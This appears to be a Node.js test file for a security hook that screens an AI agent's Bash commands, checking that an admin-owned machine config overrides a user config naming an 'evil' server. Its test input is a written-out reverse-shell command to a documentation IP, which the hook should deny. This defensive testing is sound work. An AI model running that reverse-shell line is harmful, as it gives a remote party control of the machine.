// Trust-anchor design phase 1A (docs/proposals/trust-anchors.md): one binding resolver, admin first.
//
//   node --test --import ./test/hermetic-env.mjs test/trust-anchor-binding.test.mjs
//
// The root-owned machine config is injected, never forged: the pure resolver takes it as an argument, and
// the spawned-hook cases run node with test/fixtures/root-files/preload.mjs, which makes cli/hook-core.mjs
// readRootOwned see /etc/moorai/config.json as root-owned (no root, no production override).
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import http from "node:http";
import { resolveBinding, bindingRefusedAlert } from "../cli/config.mjs";
import { enforcementAllowed } from "../data/enforcement.js";
import { systemConfigPath } from "../cli/server-mode.mjs";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const HOOK = join(ROOT, "cli", "moorai-hook.mjs");
const PRELOAD = pathToFileURL(join(ROOT, "test", "fixtures", "root-files", "preload.mjs")).href;
const SHELL = "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"; // #54, built-in "block"
const posixOnly = process.platform === "win32" ? "the injected reader stands in for a POSIX root-owned file" : false;

// ---- the pure resolver ----

test("resolveBinding: system good + user evil → good; the user's serverUrl is refused and named, never its value", () => {
  const user = { path: "/home/u/.moorai/config.json", data: { serverUrl: "https://collector.evil.test", tenant: "acme", installToken: "tok-user" } };
  const c = resolveBinding({ system: { serverUrl: "https://moorai.acme.internal/", tenant: "acme" }, user, env: {} });
  assert.equal(c.serverUrl, "https://moorai.acme.internal");
  assert.equal(c.tenant, "acme");
  assert.equal(c.installToken, "tok-user", "the token comes from the user's own file");
  assert.equal(c.managed, true);
  assert.deepEqual(c.refused, ["serverUrl"]);
  const a = bindingRefusedAlert(c);
  assert.equal(a.reasonCode, "BINDING_REFUSED");
  assert.deepEqual(a.refusedKeys, ["serverUrl"]);
  assert.ok(!JSON.stringify(a).includes("evil") && !JSON.stringify(a).includes("tok-user"), "content-free");
});

test("resolveBinding: the machine file never supplies the token (it is world-readable), and a refused tenant takes the user's token with it", () => {
  const c = resolveBinding({ system: { serverUrl: "https://moorai.acme.internal", tenant: "acme", installToken: "tok-in-machine-file" }, user: null, env: {} });
  assert.equal(c.installToken, "", "an installToken in the machine file is ignored");
  assert.equal(c.managed, true);
  const t = resolveBinding({ system: { serverUrl: "https://moorai.acme.internal", tenant: "acme" }, user: { path: "p", data: { tenant: "evil", installToken: "tok-evil" } }, env: {} });
  assert.equal(t.tenant, "acme");
  assert.equal(t.installToken, "");
  assert.deepEqual(t.refused, ["tenant", "installToken"]);
  const same = resolveBinding({ system: { serverUrl: "https://moorai.acme.internal", tenant: "acme" }, user: { path: "p", data: { serverUrl: "https://moorai.acme.internal/", tenant: "acme", installToken: "t" } }, env: {} });
  assert.deepEqual(same.refused, [], "a user file that agrees is not a finding");
  assert.equal(bindingRefusedAlert(same), null);
});

test("resolveBinding: with no usable machine serverUrl the result is exactly the pre-1.13 one", () => {
  const user = { path: "p", data: { serverUrl: "https://console.example", tenant: "t1", installToken: "k" } };
  assert.deepEqual(resolveBinding({ system: null, user, env: {} }), { serverUrl: "https://console.example", tenant: "t1", installToken: "k" });
  assert.deepEqual(resolveBinding({ system: { serverUrl: "not a url" }, user, env: {} }), { serverUrl: "https://console.example", tenant: "t1", installToken: "k" });
  assert.deepEqual(resolveBinding({ system: null, user: null, env: { MoorAI_SERVER: "http://x:1" } }), { serverUrl: "http://x:1", tenant: "unprovisioned" });
});

test("enforcementAllowed: an admin binding is management evidence, so a missing token does not mean coach", () => {
  assert.equal(enforcementAllowed({ serverUrl: "https://a", tenant: "t", installToken: "" }), false);
  assert.equal(enforcementAllowed({ serverUrl: "https://a", tenant: "t", installToken: "", managed: true }), true);
  assert.equal(enforcementAllowed(null), false);
});

// ---- end to end through the real hook ----

async function consoleServer(policy = JSON.stringify({ captureTier: "content-free" })) {
  const requests = [], alerts = [];
  const srv = http.createServer((req, res) => {
    let body = "";
    req.on("data", (d) => (body += d));
    req.on("end", () => {
      requests.push({ method: req.method, url: req.url, token: req.headers["x-install-token"] || "" });
      if (req.method === "POST") { try { if (req.url === "/api/alerts") alerts.push(JSON.parse(body)); } catch { /* ignore */ } res.writeHead(201); return res.end("{}"); }
      if (req.url.startsWith("/api/policy/pubkey")) { res.writeHead(404); return res.end(); }
      if (req.url.startsWith("/api/policy")) { res.writeHead(200, { "content-type": "application/json" }); return res.end(policy); }
      res.writeHead(404); res.end();
    });
  });
  await new Promise((r) => srv.listen(0, "127.0.0.1", r));
  return { url: `http://127.0.0.1:${srv.address().port}`, requests, alerts, close: () => new Promise((r) => srv.close(r)) };
}
function sandbox(userConfig) {
  const home = mkdtempSync(join(tmpdir(), "moorai-binding-"));
  mkdirSync(join(home, ".moorai"), { recursive: true });
  mkdirSync(join(home, "proj"), { recursive: true });
  if (userConfig) writeFileSync(join(home, ".moorai", "config.json"), JSON.stringify(userConfig));
  return home;
}
function runHook(home, rootFiles, command, extraEnv = {}) {
  const payload = { hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command }, session_id: "bind", cwd: join(home, "proj") };
  const env = { PATH: process.env.PATH || "/usr/bin:/bin", HOME: home, USERPROFILE: home, XDG_CONFIG_HOME: join(home, ".config"), XDG_STATE_HOME: join(home, ".local", "state"), CLAUDE_PROJECT_DIR: join(home, "proj"), MOORAI_TEST_ROOT_FILES: JSON.stringify(rootFiles), ...extraEnv };
  return new Promise((res) => {
    const c = spawn(process.execPath, ["--import", PRELOAD, HOOK], { cwd: join(home, "proj"), env });
    let out = "", err = "";
    c.stdout.on("data", (d) => (out += d)); c.stderr.on("data", (d) => (err += d));
    c.on("close", (status) => { const t = out.trim(); res({ status, out: t ? JSON.parse(t) : {}, err }); });
    c.stdin.end(JSON.stringify(payload));
  });
}
const decision = (o) => (o.hookSpecificOutput && o.hookSpecificOutput.permissionDecision) || (o.systemMessage ? "coach" : "allow");
const settle = (ms) => new Promise((r) => setTimeout(r, ms));

test("E2E: system config names the good console, ~/.moorai/config.json names an evil one — the evil listener receives nothing", { skip: posixOnly }, async () => {
  const good = await consoleServer(), evil = await consoleServer();
  const home = sandbox({ serverUrl: evil.url, tenant: "acme", installToken: "tok-USER-a1" });
  try {
    const r = await runHook(home, { [systemConfigPath()]: JSON.stringify({ serverUrl: good.url, tenant: "acme" }) }, SHELL);
    assert.equal(r.status, 0, r.err);
    assert.equal(decision(r.out), "deny", JSON.stringify(r.out));
    await settle(1500); // detached workers (posture beat, usage flush, deferred alerts) get their chance
    assert.equal(evil.requests.length, 0, `the evil console received ${JSON.stringify(evil.requests)}`);
    assert.ok(good.requests.some((q) => q.method === "GET" && q.url.startsWith("/api/policy?tenant=acme")), JSON.stringify(good.requests));
    assert.ok(good.requests.filter((q) => q.method === "POST").every((q) => q.token === "tok-USER-a1"), "posts carry the user's token, to the admin console only");
    const refused = good.alerts.find((a) => a.reasonCode === "BINDING_REFUSED");
    assert.ok(refused, `no BINDING_REFUSED alert: ${JSON.stringify(good.alerts.map((a) => a.category))}`);
    assert.deepEqual(refused.refusedKeys, ["serverUrl"]);
    assert.ok(!JSON.stringify(refused).includes(evil.url), "the refused value never leaves the device");
  } finally { await good.close(); await evil.close(); rmTree(home); }
});

test("E2E: a managed device whose user config has no token denies a reverse shell instead of coaching, and records the undelivered alerts locally", { skip: posixOnly }, async () => {
  const good = await consoleServer();
  const home = sandbox({ serverUrl: good.url, tenant: "acme" }); // installToken deleted
  try {
    const r = await runHook(home, { [systemConfigPath()]: JSON.stringify({ serverUrl: good.url, tenant: "acme" }) }, SHELL);
    assert.equal(r.status, 0, r.err);
    assert.equal(decision(r.out), "deny", `expected deny, got ${JSON.stringify(r.out)}`);
    await settle(300);
    assert.equal(good.alerts.length, 0, "no token: nothing is posted (the console would reject it)");
    const audit = readFileSync(join(home, ".moorai", "action-audit.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l));
    const note = audit.find((a) => a.contentHash === "binding:no-token");
    assert.ok(note, `no local record of the undelivered alerts: ${audit.map((a) => a.contentHash).join(", ")}`);
    assert.ok(note.undelivered >= 1 && Number.isInteger(note.seqFrom) && note.seqTo >= note.seqFrom, JSON.stringify(note));
    assert.ok(existsSync(join(home, ".moorai", ".chain-alerts.head.json")), "the alerts still took sequence numbers");
  } finally { await good.close(); rmTree(home); }
});

test("E2E control: the same user config with no machine config coaches (unmanaged, as before)", { skip: posixOnly }, async () => {
  const home = sandbox({ serverUrl: "http://127.0.0.1:9", tenant: "acme" });
  try {
    const r = await runHook(home, {}, SHELL);
    assert.equal(r.status, 0, r.err);
    assert.equal(decision(r.out), "coach", JSON.stringify(r.out));
  } finally { rmTree(home); }
});
